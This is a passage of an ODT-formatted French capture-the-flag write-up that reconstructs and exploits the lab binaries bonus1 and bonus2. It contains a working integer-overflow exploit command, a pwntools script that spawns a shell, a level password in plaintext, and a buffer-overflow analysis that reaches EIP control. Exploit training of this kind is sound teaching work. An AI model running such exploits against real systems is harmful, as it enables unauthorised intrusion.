      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">memcpy(buff,</text:span> <text:span text:style-name="T4">argv[</text:span><text:span text:style-name="T10">2</text:span><text:span text:style-name="T4">],</text:span> <text:span text:style-name="T4">n</text:span> <text:span text:style-name="T4">*</text:span> <text:span text:style-name="T10">4</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(n</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">0x574f4c46</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">execl(</text:span><text:span text:style-name="T11">"/bin/sh"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T11">"sh"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(</text:span><text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P4">Dans ce programme, l'objectif est assez clair. Il faut que <text:span text:style-name="T3">buff </text:span>overflow sur l'entier <text:span text:style-name="T3">n</text:span> qui se trouve juste après en mémoire, afin de lui faire adopter la valeur <text:span text:style-name="T13">0x574f4c46</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">L'appel à <text:span text:style-name="T3">memcpy </text:span>devrait être le moyen pour nous de faire en sortes que cela arrive, d'autant plus qu'on maîtrise ce qui est copié dans <text:span text:style-name="T3">buff</text:span> (argv[2]). Pour résumer, l'objectif est de faire en sortes que le memcpy copie <text:span text:style-name="T3">44 bytes </text:span>dans <text:span text:style-name="T3">buff </text:span>(overflow de 4 qui écrase en mémoire l'entier <text:span text:style-name="T3">n </text:span>qu se trouve juste après buff), et que argv[2] se compose de 40 random bytes, puis de 0x574f4c46.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Le problème va être de copier ces 44 bytes. En effet, la taille du memcpy est de <text:span text:style-name="T3">n * 4</text:span>, or le programme empêche <text:span text:style-name="T3">n </text:span>d'être supérieur à <text:span text:style-name="T3">9</text:span> (donc n * 4 peut être au maximum 36). Comment contourner cette protection ?</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">La vulnérabilité réside ici dans le fait que <text:span text:style-name="T3">n est un entier</text:span>, qui est cependant utilisé comme variable de memcpy <text:span text:style-name="T3">en tant que size_t </text:span>(donc <text:span text:style-name="T3">unsigned int</text:span>).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Imaginons qu'on fournisse en argv[1] un nombre négatif, par exemple -2. Cela sera encodé comme 0xfffffffe en mémoire, ce qui signifie bien -1 lorsque le programme le considère comme un entier signé, mais 4294967294 lorsqu'il tente de l'interpréter comme un unsigned int. C'est donc cet énorme nombre (multiplié par 4) qui sera transmis à <text:span text:style-name="T3">memcpy</text:span>, ce qui fera crash le programme.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Il nous faut donc un moyen maintenant pour que <text:span text:style-name="T3">n * 4</text:span> soit précisément égal à <text:span text:style-name="T3">44 </text:span>en fournissant au programme un chiffre négatif afin de contourner la protection du "inférieur à 9".</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On a créé un petit programme, <text:span text:style-name="T3">values.c</text:span>, qui traduit un entier signé dans sa représentation hexadécimale, signed int, et unsigned int (en le multipliant par 4) :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P15">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T8">main</text:span><text:span text:style-name="T4">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">argc,</text:span> <text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">**argv)</text:span></text:p>
      <text:p text:style-name="P19"><text:soft-page-break/>{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">n</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">atoi(argv[</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">]);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">printf(</text:span><text:span text:style-name="T11">"As hex <text:s text:c="11"/>--&gt; <text:s text:c="3"/>0x%08x\n"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">n*</text:span><text:span text:style-name="T10">4</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">n*</text:span><text:span text:style-name="T10">4</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">printf(</text:span><text:span text:style-name="T11">"As signed int <text:s text:c="7"/>--&gt; <text:s text:c="3"/>%d\n"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">n*</text:span><text:span text:style-name="T10">4</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">n*</text:span><text:span text:style-name="T10">4</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">printf(</text:span><text:span text:style-name="T11">"As unsigned int <text:s text:c="7"/>--&gt; <text:s text:c="3"/>%zu\n"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">n*</text:span><text:span text:style-name="T10">4</text:span><text:span text:style-name="T4">,n*</text:span><text:span text:style-name="T10">4</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(</text:span><text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P4">On essaie avec différentes valeurs, jusqu'à trouver celle qui aboutit à la valeur que l'on souhaite :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images21" text:anchor-type="paragraph" svg:x="0.071cm" svg:y="0cm" svg:width="9.447cm" svg:height="9.551cm" draw:z-index="20"><draw:image xlink:href="Pictures/20000007000024E700002550E0CF0A0B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">NOTE : on s'aperçoit qu'en réalité, la différence de traitement entre signed int / unsigned int n'était même pas nécessaire ici. C'est-à-dire que même si <text:span text:style-name="T3">memcpy prenait un entier signé</text:span>, la vulnérabilité aurait été la même car en multipliant cet entier par 4, on provoque un overflow qui nous fait retourner dans les positifs.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Bref, argv[1] doit être -2147483637 pour que memcpy copie 44 bytes. Il ne nous reste plus qu'à définir argv[2] comme <text:span text:style-name="T13">'A' * 40 + '\x46\x4c\x4f\x57'</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">&gt;&gt; <text:span text:style-name="T15">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8">$ ./bonus1 '-2147483637' $(python -c "print('A' * 40 + '\x46\x4c\x4f\x57')")</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">&gt;&gt; <text:span text:style-name="T15">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P20"><text:span text:style-name="T1">from</text:span> <text:span text:style-name="T9">pwn</text:span> <text:span text:style-name="T1">import</text:span> <text:span text:style-name="T4">*</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T4">argv_1</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'-2147483637'</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T4">argv_2</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'A'</text:span> <text:span text:style-name="T4">*</text:span> <text:span text:style-name="T10">40</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">argv_2</text:span> <text:span text:style-name="T4">+=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'\x46\x4c\x4f\x57'</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:soft-page-break/><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bonus1"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">password=</text:span><text:span text:style-name="T11">"cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9"</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">s.process([</text:span><text:span text:style-name="T11">"/home/user/bonus1/./bonus1"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">argv_1,</text:span> <text:span text:style-name="T4">argv_2])</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P10">p.interactive()</text:p>
      <text:p text:style-name="P3">Got flag<text:span text:style-name="T1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552121284475944994" text:style-name="L15">
        <text:list-item>
          <text:p text:style-name="P27"><text:soft-page-break/>Bonus 2</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Reconstruction du code source :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P15">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">language</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span> <text:s text:c="23"/><text:span text:style-name="T6">// 0x8049988</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T8">greetuser</text:span><text:span text:style-name="T4">(</text:span><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*arg)</text:span> <text:s text:c="13"/><text:span text:style-name="T6">// arg max length : 73</text:span></text:p>
      <text:p text:style-name="P19">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">str[</text:span><text:span text:style-name="T10">72</text:span><text:span text:style-name="T4">];</text:span> <text:s text:c="23"/><text:span text:style-name="T6">// [ebp-0x48]</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(language</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*hey</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">"Hello "</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(i</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">6</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T4">str[i]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">hey[i];</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T4">i++;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">str[i]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">else</text:span> <text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(language</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*hey</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">"Hyvää päivää "</text:span><text:span text:style-name="T4">;</text:span> <text:s text:c="5"/><text:span text:style-name="T6">// encoded on 2 bytes ; 0xa4c3</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(i</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">18</text:span><text:span text:style-name="T4">)</text:span> <text:s text:c="19"/><text:span text:style-name="T6">// 18 instead of 13</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T4">str[i]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">hey[i];</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T4">i++;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">str[i]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">else</text:span> <text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(language</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">2</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*hey</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">"Goedemiddag! "</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(i</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">13</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T4">str[i]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">hey[i];</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T4">i++;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">str[i]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">strcat(str,</text:span> <text:span text:style-name="T4">arg);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(puts(str));</text:span></text:p>
      <text:p text:style-name="P19">}</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T8">main</text:span><text:span text:style-name="T4">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">argc,</text:span> <text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">**argv)</text:span></text:p>
      <text:p text:style-name="P19"><text:soft-page-break/>{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(argc</text:span> <text:span text:style-name="T4">!=</text:span> <text:span text:style-name="T10">3</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T4">buffer[</text:span><text:span text:style-name="T10">73</text:span><text:span text:style-name="T4">];</text:span> <text:s text:c="18"/><text:span text:style-name="T6">// [esp+0x50]</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T4">*lang;</text:span> <text:s text:c="23"/><text:span text:style-name="T6">// [esp+0x9c]</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(i</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">73</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">buffer[i++]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">'\0'</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">strncpy(buffer,</text:span> <text:span text:style-name="T4">argv[</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">],</text:span> <text:span text:style-name="T10">40</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">strncpy(buffer+</text:span><text:span text:style-name="T10">40</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">argv[</text:span><text:span text:style-name="T10">2</text:span><text:span text:style-name="T4">],</text:span> <text:span text:style-name="T10">32</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">lang</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">getenv(</text:span><text:span text:style-name="T11">"LANG"</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(lang</text:span> <text:span text:style-name="T4">!=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(memcmp(lang,</text:span> <text:span text:style-name="T11">"fi"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T10">0x2</text:span><text:span text:style-name="T4">)</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T4">language</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0x1</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">else</text:span> <text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(memcmp(lang,</text:span> <text:span text:style-name="T11">"nl"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T10">0x2</text:span><text:span text:style-name="T4">)</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T4">language</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0x2</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T4">arg[</text:span><text:span text:style-name="T10">73</text:span><text:span text:style-name="T4">];</text:span> <text:s text:c="19"/><text:span text:style-name="T6">// [esp+0x0]</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(i</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">73</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">arg[i]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">buffer[i];</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">i++;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span><text:span text:style-name="T4">(greetuser(arg));</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P4">Quelques spécificités dans la reconstruction du code source. D'abord, les parties de main où des données sont assignées aux buffer (par exemple des \0 pour remplir <text:span text:style-name="T3">buffer</text:span>, ou ensuite la copie de buffer dans arg). Les données sont déplacées de cette façon :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images22" text:anchor-type="paragraph" svg:width="19.999cm" svg:height="3.291cm" draw:z-index="21"><draw:image xlink:href="Pictures/200000070000506A00000D3CB67F13D6.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">On déplace 4 bytes par 4 bytes de la source jusqu'à la destination.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">De même dans la fonction <text:span text:style-name="T3">greetuser</text:span><text:span text:style-name="T12">, on déplace les bytes un peu de cette manière aussi :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images23" text:anchor-type="paragraph" svg:width="18.999cm" svg:height="4.128cm" draw:z-index="22"><draw:image xlink:href="Pictures/20000007000044F100000EFD3837946C.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P2">Note finale : on donne en premier argument à la fonction <text:span text:style-name="T3">greetuser </text:span><text:span text:style-name="T12">non pas un pointeur qui mène à une chaîne de caractère : on copie directement la chaîne à </text:span><text:span text:style-name="T3">[esp]</text:span><text:span text:style-name="T12">.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Quoi qu'il en soit, juste avant l'appel à </text:span><text:span text:style-name="T3">greetuser </text:span><text:span text:style-name="T12">la mémoire sur la stack ressemble à cela lorsqu'on donne au programme une très longue chaîne de A en argv[1], puis une très longue chaîne de B en argv[2].</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images24" text:anchor-type="paragraph" svg:width="18.755cm" svg:height="6.122cm" draw:z-index="23"><draw:image xlink:href="Pictures/200000070000501A00001A271B91861C.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">Lorsqu'on <text:span text:style-name="T3">continue</text:span><text:span text:style-name="T12"> sur gdb, l'application crash :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images25" text:anchor-type="paragraph" svg:width="18.538cm" svg:height="3.143cm" draw:z-index="24"><draw:image xlink:href="Pictures/200000070000427600000B457A248AC0.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">La raison est simple. Dans la fonction <text:span text:style-name="T3">greetuser</text:span>, on tente de concaténer deux chaînes :</text:p>
      <text:p text:style-name="P4">&gt; <text:span text:style-name="T3">str</text:span>, qui contient déjà "Hello " (6 caractères).</text:p>
      <text:p text:style-name="P4">&gt; <text:span text:style-name="T3">arg</text:span>, qui contient 72 caractères.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Et on essaie de placer cela dans <text:span text:style-name="T3">str</text:span>, qui n'a d'alloué que <text:span text:style-name="T3">72 </text:span>bytes. Cela provoque un overflow ici de <text:span text:style-name="T3">6 bytes + le NULL BYTE de fin</text:span>. Puisque ce buffer a été déclaré en dernier dans la fonction, cela provoque un écrasement des 4 bytes de <text:span text:style-name="T3">ebp</text:span>, et des 3 premiers bytes de l'<text:span text:style-name="T3">adresse de retour</text:span> (par les 2 derniers bytes de <text:span text:style-name="T3">arg</text:span>, puis le NULL BYTE).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Il s'agit d'un overflow qui est potentiellement exploitable :</text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="https://www.welivesecurity.com/2016/05/10/exploiting-1-byte-buffer-overflows/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.welivesecurity.com/2016/05/10/exploiting-1-byte-buffer-overflows/</text:a> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Mais il reste cependant peu pratique puisqu'on ne peut pas écraser l'intégralité de l'adresse retour. <text:soft-page-break/>En réalité, on nous indique très clairement un moyen de permettre à l'overflow d'écraser complètement l'adresse de retour : changer <text:span text:style-name="T3">la langue</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">En effet, si la variable d'environnement "LANG" vaut <text:span text:style-name="T3">nl</text:span>, <text:span text:style-name="T3">str </text:span>contiendra déjà 13 bytes avant qu'on essaie de concaténer <text:span text:style-name="T3">arg</text:span> qui contient 72 bytes ; on aura un overflow de <text:span text:style-name="T3">13 bytes</text:span>, suffisant pour écraser l'adresse de retour. Cela est encore plus flagrant avec la langue <text:span text:style-name="T3">fi</text:span>, qui contient des caractères encodés sur <text:span text:style-name="T3">2 bytes</text:span> et qui fait que <text:span text:style-name="T3">str </text:span>contiendra déjà 18 bytes, provoquant un overflow de 18 bytes.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images26" text:anchor-type="paragraph" svg:x="0.044cm" svg:y="0cm" svg:width="11.352cm" svg:height="2.91cm" draw:z-index="25"><draw:image xlink:href="Pictures/2000000700002C5800000B5F1CA71990.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">On trouve l'offset dans argv[2] qui permet de contrôler l'adresse de retour : 18. Bref, on contrôle entièrement <text:span text:style-name="T3">EIP</text:span><text:span text:style-name="T12">. A partir de là, on pourrait appliquer la méthode employée dans le </text:span><text:span text:style-name="T7">bonus0 </text:span><text:span text:style-name="T12">et mettre notre shellcode dans une variable d'environnement avec une grosse NOPsled. On a cependant cette fois un moyen </text:span><text:span text:style-name="T3">plus élégant</text:span><text:span text:style-name="T12"> d'exécuter notre shellcode.</text:span></text:p>
      <text:p text:style-name="P4"/>
